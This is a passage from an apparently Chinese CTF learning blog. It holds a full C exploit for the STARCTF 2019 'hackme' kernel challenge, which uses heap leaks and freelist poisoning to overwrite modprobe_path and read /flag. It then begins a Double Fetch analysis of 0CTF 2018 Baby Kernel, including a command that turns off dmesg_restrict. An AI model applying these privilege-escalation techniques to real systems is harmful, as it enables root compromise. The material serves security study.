class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/sir&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/pwn/sir&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    system(<span class="string">&quot;/home/pwn/sir&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /home/pwn/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ <a href="http://p4nda.top/">P4nda</a> å¸ˆå‚…çš„è„šæœ¬ï¼Œæˆ‘å’Œä»–çš„æ€è·¯å·®ä¸å¤š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC 0x30000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL 0x30001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ 0x30003</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE 0x30002</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">size_t</span> idx;</span><br><span class="line"><span class="type">void</span> *addr;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> len;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx,<span class="type">char</span> *user,<span class="type">long</span> <span class="type">long</span> len)</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">cmd.idx = idx;</span><br><span class="line">cmd.len = len;</span><br><span class="line">cmd.addr = user;</span><br><span class="line">ioctl(fd,ALLOC,&amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx)</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">cmd.idx = idx;</span><br><span class="line">ioctl(fd,DEL,&amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_from_kernel</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx,<span class="type">char</span> *user,<span class="type">long</span> <span class="type">long</span> len,<span class="type">long</span> <span class="type">long</span> offset)</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">cmd.idx = idx;</span><br><span class="line">cmd.len = len;</span><br><span class="line">cmd.addr = user;</span><br><span class="line">cmd.offset = offset;</span><br><span class="line">ioctl(fd,READ,&amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_to_kernel</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx,<span class="type">char</span> *user,<span class="type">long</span> <span class="type">long</span> len,<span class="type">long</span> <span class="type">long</span> offset)</span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">cmd.idx = idx;</span><br><span class="line">cmd.len = len;</span><br><span class="line">cmd.addr = user;</span><br><span class="line">cmd.offset = offset;</span><br><span class="line">ioctl(fd,WRITE,&amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex</span><span class="params">( <span class="type">char</span> *buf,<span class="type">int</span> size)</span>&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;(size/<span class="number">8</span>);i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (i%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i/<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>,*(<span class="type">size_t</span> * )(buf + i*<span class="number">8</span>));</span><br><span class="line"><span class="keyword">if</span> (i%<span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;/dev/hackme&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="type">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="type">size_t</span> heap_addr , kernel_addr,mod_addr;</span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] bad open /dev/hackme\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(mem,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">0</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">1</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">2</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">3</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(fd,<span class="number">1</span>);</span><br><span class="line">delete(fd,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_from_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">heap_addr = *((<span class="type">size_t</span>  *)mem);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] heap addr : %16llx\n&quot;</span>,heap_addr );</span><br><span class="line">read_from_kernel(fd,<span class="number">0</span>,mem,<span class="number">0x200</span>,<span class="number">-0x200</span>);</span><br><span class="line">kernel_addr = *((<span class="type">size_t</span>  *)(mem+<span class="number">0x28</span>)) ;</span><br><span class="line"><span class="keyword">if</span> ((kernel_addr &amp; <span class="number">0xfff</span>) != <span class="number">0xae0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] maybe bad kernel leak : %16llx\n&quot;</span>,kernel_addr);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kernel_addr -= <span class="number">0x849ae0</span>; <span class="comment">//0x849ae0 - sysctl_table_root</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] kernel addr : %16llx\n&quot;</span>,kernel_addr );</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(mem,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">*((<span class="type">size_t</span> *)mem) = (<span class="number">0x811000</span> + kernel_addr + <span class="number">0x40</span>); <span class="comment">// mod_tree +0x40</span></span><br><span class="line">write_to_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line"></span><br><span class="line">alloc(fd,<span class="number">5</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">6</span>,mem,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">read_from_kernel(fd,<span class="number">6</span>,mem,<span class="number">0x40</span>,<span class="number">-0x40</span>);</span><br><span class="line">mod_addr =  *((<span class="type">size_t</span>  *)(mem+<span class="number">0x18</span>)) ;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] mod addr : %16llx\n&quot;</span>,mod_addr );</span><br><span class="line"></span><br><span class="line">delete(fd,<span class="number">2</span>);</span><br><span class="line">delete(fd,<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">*((<span class="type">size_t</span> *)mem) = (<span class="number">0x2400</span> + mod_addr + <span class="number">0xc0</span>); <span class="comment">// mod_tree +0x40</span></span><br><span class="line">write_to_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">alloc(fd,<span class="number">7</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">*((<span class="type">size_t</span> *)(mem+<span class="number">0x8</span>)) = <span class="number">0x100</span>; </span><br><span class="line">*((<span class="type">size_t</span> *)mem) = (<span class="number">0x83f960</span> + kernel_addr ); <span class="comment">//ffffffff8183f960 D modprobe_path</span></span><br><span class="line">alloc(fd,<span class="number">8</span>,mem,<span class="number">0x100</span>); <span class="comment">// pool</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">strncpy</span>(mem,<span class="string">&quot;/home/pwn/copy.sh\0&quot;</span>,<span class="number">18</span>);</span><br><span class="line">write_to_kernel(fd,<span class="number">0xc</span>,mem,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304172129949.png" alt="image-20230417212958765" style="zoom:50%;" /><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://blog.csdn.net/yongbaoii/article/details/123583502">(47æ¡æ¶ˆæ¯) linux kernal pwn STARCTF 2019 hackmeï¼ˆä¸€ï¼‰ åŠ«æŒmodprobe_path_yongbaoiiçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://kileak.github.io/ctf/2019/xctf-hackme/">XCTF - *CTF 2019 - hack_me | kileak</a></p><p><a href="http://p4nda.top/2019/05/01/starctf-2019-hackme/">(<em>Â´âˆ‡ï½€</em>) å¤©äº®äº†~ ã€KERNEL PWNã€‘STARCTF 2019 hackme è§£é¢˜æ€è·¯ | p4ndaâ€™s blog</a></p><p>[<a href="https://bbs.kanxue.com/thread-254178.htm">åŸåˆ›]Linux Kernel Exploit å†…æ ¸æ¼æ´å­¦ä¹ (4)-RW Any Memory-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com (kanxue.com)</a></p><p><a href="https://www.secpulse.com/archives/153929.html">åŸºäºmodprobe_pathè¦†ç›–çš„Linuxå†…æ ¸æ¼æ´åˆ©ç”¨æŠ€æœ¯ - SecPulse.COM | å®‰å…¨è„‰æ</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel-RW Any Memory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äº kernel-Double Fetch çš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/6176bce9.html"/>
      <url>/posts/6176bce9.html</url>
      
        <content type="html"><![CDATA[<h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><blockquote><p><code>Double Fetch</code> ä»æ¼æ´åŸç†ä¸Šå±äºæ¡ä»¶ç«äº‰æ¼æ´ï¼Œæ˜¯ä¸€ç§å†…æ ¸æ€ä¸ç”¨æˆ·æ€ä¹‹é—´çš„æ•°æ®è®¿é—®ç«äº‰ã€‚</p><p>åœ¨ Linux ç­‰ç°ä»£æ“ä½œç³»ç»Ÿä¸­ï¼Œè™šæ‹Ÿå†…å­˜åœ°å€é€šå¸¸è¢«åˆ’åˆ†ä¸ºå†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´ã€‚å†…æ ¸ç©ºé—´è´Ÿè´£è¿è¡Œå†…æ ¸ä»£ç ã€é©±åŠ¨æ¨¡å—ä»£ç ç­‰ï¼Œæƒé™è¾ƒé«˜ã€‚è€Œç”¨æˆ·ç©ºé—´è¿è¡Œç”¨æˆ·ä»£ç ï¼Œå¹¶é€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸å®Œæˆç›¸å…³åŠŸèƒ½ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œç”¨æˆ·ç©ºé—´å‘å†…æ ¸ä¼ é€’æ•°æ®æ—¶ï¼Œå†…æ ¸å…ˆé€šè¿‡é€šè¿‡ <code>copy_from_user</code> ç­‰æ‹·è´å‡½æ•°å°†ç”¨æˆ·æ•°æ®æ‹·è´è‡³å†…æ ¸ç©ºé—´è¿›è¡Œæ ¡éªŒåŠç›¸å…³å¤„ç†ï¼Œä½†<strong>åœ¨è¾“å…¥æ•°æ®è¾ƒä¸ºå¤æ‚æ—¶ï¼Œå†…æ ¸å¯èƒ½åªå¼•ç”¨å…¶æŒ‡é’ˆï¼Œè€Œå°†æ•°æ®æš‚æ—¶ä¿å­˜åœ¨ç”¨æˆ·ç©ºé—´è¿›è¡Œåç»­å¤„ç†ã€‚æ­¤æ—¶ï¼Œè¯¥æ•°æ®å­˜åœ¨è¢«å…¶ä»–æ¶æ„çº¿ç¨‹ç¯¡æ”¹é£é™©ï¼Œé€ æˆå†…æ ¸éªŒè¯é€šè¿‡æ•°æ®ä¸å®é™…ä½¿ç”¨æ•°æ®ä¸ä¸€è‡´ï¼Œå¯¼è‡´å†…æ ¸ä»£ç æ‰§è¡Œå¼‚å¸¸</strong>ã€‚</p><p>ä¸€ä¸ªå…¸å‹çš„ <code>Double Fetch</code> æ¼æ´åŸç†å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œä¸€ä¸ªç”¨æˆ·æ€çº¿ç¨‹å‡†å¤‡æ•°æ®å¹¶é€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸ï¼Œè¯¥æ•°æ®åœ¨å†…æ ¸ä¸­æœ‰ä¸¤æ¬¡è¢«å–ç”¨ï¼Œå†…æ ¸ç¬¬ä¸€æ¬¡å–ç”¨æ•°æ®è¿›è¡Œå®‰å…¨æ£€æŸ¥ï¼ˆå¦‚ç¼“å†²åŒºå¤§å°ã€æŒ‡é’ˆå¯ç”¨æ€§ç­‰ï¼‰ï¼Œå½“æ£€æŸ¥é€šè¿‡åå†…æ ¸ç¬¬äºŒæ¬¡å–ç”¨æ•°æ®è¿›è¡Œå®é™…å¤„ç†ã€‚è€Œåœ¨ä¸¤æ¬¡å–ç”¨æ•°æ®ä¹‹é—´ï¼Œå¦ä¸€ä¸ªç”¨æˆ·æ€çº¿ç¨‹å¯åˆ›é€ æ¡ä»¶ç«äº‰ï¼Œå¯¹å·²é€šè¿‡æ£€æŸ¥çš„ç”¨æˆ·æ€æ•°æ®è¿›è¡Œç¯¡æ”¹ï¼Œåœ¨çœŸå®ä½¿ç”¨æ—¶é€ æˆè®¿é—®è¶Šç•Œæˆ–ç¼“å†²åŒºæº¢å‡ºï¼Œæœ€ç»ˆå¯¼è‡´å†…æ ¸å´©æºƒæˆ–æƒé™æå‡ã€‚</p></blockquote><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041615674.png" alt="image-20230404161502570" style="zoom:50%;" /><p>å› ä¸º <code>CTF wiki</code> ä¸Šè¿™é‡Œæ€»ç»“çš„éå¸¸å¥½ï¼ˆå»ºè®®åå¤é˜…è¯» QAQ ï¼‰ï¼Œå³ä½¿å†å™è¿°ä¸€éä¹Ÿæ„Ÿè§‰æ„ä¹‰ä¸å¤§ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è¿›è¡Œäº†å¼•ç”¨</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/double-fetch/">Double Fetch - CTF Wiki (ctf-wiki.org)</a></p><h3 id="2018-0CTF-Finals-Baby-Kernel"><a href="#2018-0CTF-Finals-Baby-Kernel" class="headerlink" title="2018 0CTF Finals Baby Kernel"></a>2018 0CTF Finals Baby Kernel</h3><p>é¢˜ç›®é“¾æ¥ï¼š<a href="https://github.com/cc-sir/ctf-challenge/tree/master/2018%200CTF%20Finals%20Baby%20Kernel">https://github.com/cc-sir/ctf-challenge/tree/master/2018%200CTF%20Finals%20Baby%20Kernel</a></p><h4 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h4><h5 id="SMAP-x2F-SMEP"><a href="#SMAP-x2F-SMEP" class="headerlink" title="SMAP&#x2F;SMEP"></a>SMAP&#x2F;SMEP</h5><p><code>SMAP</code> å³<code>ç®¡ç†æ¨¡å¼è®¿é—®ä¿æŠ¤</code>ï¼ˆSupervisor Mode Access Preventionï¼‰ï¼Œå½“å¼€å¯è¿™ä¸ªä¿æŠ¤åï¼Œåœ¨å†…æ ¸æ¨¡å¼ä¸‹æ— è®ºæ˜¯å†™å…¥æˆ–è€…è¯»å–ç”¨æˆ·æ¨¡å¼ä¸‹çš„æ•°æ®éƒ½ä¼šé€ æˆå†…å­˜å¼‚å¸¸ã€‚<code>SMEP</code> ï¼ˆSupervisor Mode Execution Preventionï¼‰åˆ™æ˜¯ <code>ç®¡ç†æ¨¡å¼æ‰§è¡Œä¿æŠ¤</code>ï¼Œé˜»æ­¢å†…æ ¸ç©ºé—´ä¸­æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„æ•°æ®ã€‚</p><h5 id="å¯åŠ¨æ–‡ä»¶çš„è®¾ç½®"><a href="#å¯åŠ¨æ–‡ä»¶çš„è®¾ç½®" class="headerlink" title="å¯åŠ¨æ–‡ä»¶çš„è®¾ç½®"></a>å¯åŠ¨æ–‡ä»¶çš„è®¾ç½®</h5><p><code>lsmod</code> å‘½ä»¤æŸ¥çœ‹æ¨¡å—åŸºåœ°å€ä¸º <code>0</code> ï¼Œéœ€è¦æœ¬åœ°è°ƒè¯•çš„æ—¶å€™ä¿®æ”¹ <code>init</code> æ–‡ä»¶ï¼ˆæ”¹å®Œä¹‹åï¼Œå†å°†æ–‡ä»¶ç³»ç»Ÿæ‰“åŒ…ï¼‰ï¼Œå°†åŸæœ¬çš„ <code>setsid cttyhack setuidgid 1000 sh</code> æ”¹ä¸º <code>setsid cttyhack setuidgid 0 sh</code> å³å¯ã€‚</p><p>å…³é—­ <code>kaslr</code> çš„è¯ï¼Œåœ¨ <code>start.sh</code> æ–‡ä»¶çš„æ­¤å¤„åŠ ä¸Š <code>nokaslr</code> å³å¯ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303292040104.png" alt="image-20230329204004810"></p><p>å†…æ ¸ä¸­ä»¥ <code>printk</code> è¾“å‡ºçš„å†…å®¹ï¼Œå¯ä»¥é€šè¿‡ <code>dmesg</code> å‘½ä»¤æŸ¥çœ‹ã€‚å‰ææ˜¯éœ€è¦å…³é—­ <code>dmesg_restrict</code> ï¼Œå¦åˆ™æ— æ³•æŸ¥çœ‹ <code>printk</code> ä¿¡æ¯ï¼Œå…³é—­æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br></pre></td></tr></table></figure><p>ç³»ç»Ÿå†…æ ¸å‚æ•° <code>kernel.dmesg_restrict</code> ç”¨äºæ§åˆ¶æ™®é€šç”¨æˆ·æ˜¯å¦å¯ä»¥æŸ¥çœ‹å†…æ ¸æ—¥å¿— <code>dmesg</code>ã€‚å½“è¯¥å‚æ•°å€¼ä¸º1æ—¶ï¼Œåªæœ‰ <code>root</code> ç”¨æˆ·æ‰èƒ½æŸ¥çœ‹å†…æ ¸æ—¥å¿—ï¼Œè€Œæ™®é€šç”¨æˆ·åˆ™æ— æ³•æŸ¥çœ‹ã€‚è€Œå°†è¯¥å‚æ•°å€¼è®¾ç½®ä¸º0ï¼Œå…è®¸æ™®é€šç”¨æˆ·æŸ¥çœ‹å†…æ ¸æ—¥å¿—ã€‚</p><p><strong>æ³¨æ„ï¼šæœ¬é¢˜ç”±äºä»å†…æ ¸ä¸­è®¿é—®äº†ç”¨æˆ·æ€çš„æ•°æ®ï¼Œæ‰€ä»¥è¦å…³é—­ <code>SMAP</code> ä¿æŠ¤ï¼Œå¦åˆ™ä¼šå¯¼è‡´ <code>kernel panic</code></strong></p><h4 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h4><p>å½“ <code>a2</code> ä¸º <code>0x1337</code> ä¼šåšä¸‰ä¸ªæ£€æŸ¥</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304031554946.png" alt="image-20230403155425780"></p><p>å‘ç°ç¬¬ä¸€ä¸ª <code>_chk_range_not_ok</code> å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ <code>(&amp;current_task) + 0x1358</code> ï¼Œè¿™ä¸ªä½ç½®æ˜¯ <code>stack pointer</code> å­—æ®µï¼Œè®°å½•äº†æ ˆåŒºçš„ç»“æŸåœ°å€ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·ç©ºé—´çš„æœ€å¤§èŒƒå›´ã€‚é€šè¿‡è°ƒè¯•ä¹Ÿå¯ä»¥å°è¯ï¼ˆå¦‚ä¸‹ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304031742899.png" alt="image-20230403174212778"></p><p><code>_chk_range_not_ok</code> å‡½æ•°æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°åŠ ç¬¬äºŒä¸ªå‚æ•°å¤§äºç¬¬ä¸‰ä¸ªå‚æ•°çš„æƒ…å†µä¸‹è¿”å› <code>True</code>  ï¼Œä½†è¯¥å‡½æ•°çš„å¤–é¢è¿˜æœ‰ä¸€ä¸ª <code>!</code> ï¼Œæ‰€ä»¥è¿™é‡Œçš„æƒ³è¿‡ <code>if</code> çš„è¯ï¼Œéœ€è¦æ»¡è¶³ç¬¬ä¸€ä¸ªå‚æ•°åŠ ç¬¬äºŒä¸ªå‚æ•°å°äºç¬¬ä¸‰ä¸ªå‚æ•°</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304032107333.png" alt="image-20230403210735151" style="zoom:67%;" /><p>è¿™é‡Œå‡ºç°äº†ä¸€ä¸ª <code>*(_QWORD *)v5</code> å’Œ <code>*(int *)(v5+8)</code> ï¼Œè¿™ä¸ªæ ¼å¼å¯ä»¥æ¨æ–­å‡ºæ¥ä»–ä»¬æ˜¯ç»“æ„ä½“ä¸­çš„æˆå‘˜å˜é‡ï¼Œå› ä¸ºæ‹¿ <code>*(_DWORD)(v5+8)</code> å»å’Œ <code>flag</code> çš„é•¿åº¦åšäº†æ¯”è¾ƒï¼Œå¯ä»¥çŒœæµ‹ <code>*(_DORD)(v5+8)</code> æ˜¯ æˆ‘ä»¬è¾“å…¥<code>flag</code> å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œç»“åˆå‰é¢åˆ†æ <code>_chk_range_not_ok</code> å‡½æ•°ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ç”¨æˆ·ç©ºé—´çš„æœ€å¤§èŒƒå›´ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯æŸä¸ªå€¼åŠ ä¸Šè¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè¦å°äºç”¨æˆ·åŒºçš„æœ€å¤§èŒƒå›´ï¼Œå› æ­¤æ¨æ–­è¿™ä¸ªå€¼åº”è¯¥æ˜¯æˆ‘ä»¬è¾“å…¥ <code>flag</code> çš„èµ·å§‹åœ°å€</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304032113941.png" alt="image-20230403211351891"></p><p>æ‰€ä»¥åˆ›å»ºä¸€ä¸ªç»“æ„ä½“ï¼Œæ­¤æ—¶çš„ä»£ç å¦‚ä¸‹</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040927250.png" alt="image-20230404092707055"></p><p>æŸ¥çœ‹ä¸‹é¢çš„ä»£ç çŸ¥é“ <code>v2</code> å°±æ˜¯ <code>rdx</code> ï¼Œä¹Ÿå°±æ˜¯ <code>baby_ioctl</code> å‡½æ•°ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œåæ¥å°†è¿™ä¸ªå‚æ•°èµ‹å€¼ä¸º <code>v5</code> ï¼Œå› æ­¤åœ¨ç”¨æˆ·æ¨¡å¼è°ƒç”¨ <code>baby_ioctl</code> å‡½æ•°æ—¶ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¼ å…¥æå‰å†™å¥½çš„ç»“æ„ä½“çš„æŒ‡é’ˆå³å¯ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040928159.png" alt="image-20230404092839113"></p><p>æœ€åå®Œæ•´çš„åˆ†æä¸€é <code>baby_ioctl</code> å‡½æ•°ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040933400.png" alt="image-20230404093312297"></p><p>åœ¨è°ƒç”¨ <code>ioctl</code> çš„æ—¶å€™ï¼Œç¬¬äºŒä¸ªå‚æ•°å¦‚æœä¸º <code>0x6666</code> åˆ™ä¼šæ³„éœ²å‡ºå†…æ ¸ä¸­å­˜æ”¾ <code>flag</code> çš„åœ°å€ã€‚</p><p>å¦‚æœç¬¬äºŒä¸ªå‚æ•°ä¸º <code>0x1337</code> å¹¶ä¸”ç¬¬ä¸‰ä¸ªå‚æ•°åŠ ä¸Š <code>0x10</code> å°äºç”¨æˆ·åŒºçš„æœ€å¤§ç©ºé—´å¹¶ä¸”ç¬¬ä¸‰ä¸ªå‚æ•°åŠ ä¸Šå­—ç¬¦ä¸²çš„é•¿åº¦å°äºç”¨æˆ·åŒºçš„æœ€å¤§ç©ºé—´å¹¶ä¸”å­—ç¬¦ä¸²çš„é•¿åº¦ï¼ˆè¿™ä¸ªé•¿åº¦å¹¶éçœŸçš„æ˜¯å­—ç¬¦ä¸²çš„å®é™…é•¿åº¦ï¼Œè€Œæ˜¯ç»“æ„ä½“ä¸­ <code>length</code> æˆå‘˜çš„å€¼ï¼‰è¦ç­‰äºå†…æ ¸ä¸­å­˜æ”¾çš„ <code>flag</code> é•¿åº¦ï¼Œå°±å»éå† <code>flag_addr</code> ä¸ çœŸæ­£çš„ <code>flag</code> åšå¯¹æ¯”ï¼Œå¦‚æœå®Œå…¨ä¸€æ ·åˆ™å°† <code>flag</code> è¾“å‡ºå‡ºæ¥ã€‚</p><h4 id="æ¼æ´äº§ç”Ÿ"><a href="#æ¼æ´äº§ç”Ÿ" class="headerlink" 